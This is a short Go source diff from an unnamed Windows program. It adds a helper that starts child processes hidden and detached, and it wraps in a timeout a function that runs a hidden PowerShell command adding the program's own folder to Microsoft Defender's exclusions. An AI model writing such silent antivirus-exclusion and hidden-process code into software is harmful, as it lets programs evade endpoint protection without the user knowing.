@@ -23,6 +23,13 @@ import (
 func newHiddenCmd(cmd *exec.Cmd) {
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow:    true,
+		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
+	}
+}
+
+func newDetachedCmd(cmd *exec.Cmd) {
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
 		CreationFlags: 0x08000000 | 0x00000001, // CREATE_NO_WINDOW | DETACHED_PROCESS
 	}
 }
@@ -448,9 +455,19 @@ func addDefenderExclusion() {
 	psCmd := fmt.Sprintf(`Add-MpExclusion -Path '%s' -ErrorAction SilentlyContinue`, exeDir)
 	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psCmd)
 	newHiddenCmd(cmd)
-	if err := cmd.Run(); err == nil {
-		llog("info", "Defender exclusion added for %s", exeDir)
-		return
+	done := make(chan error, 1)
+	go func() { done <- cmd.Run() }()
+	select {
+	case err := <-done:
+		if err == nil {
+			llog("info", "Defender exclusion added for %s", exeDir)
+			return
+		}
+	case <-time.After(10 * time.Second):
+		llog("warn", "Defender exclusion PowerShell timed out, skipping")
+		if cmd.Process != nil {
+			cmd.Process.Kill()
+		}
 	}
 
 	// Not admin — write instructions file for user
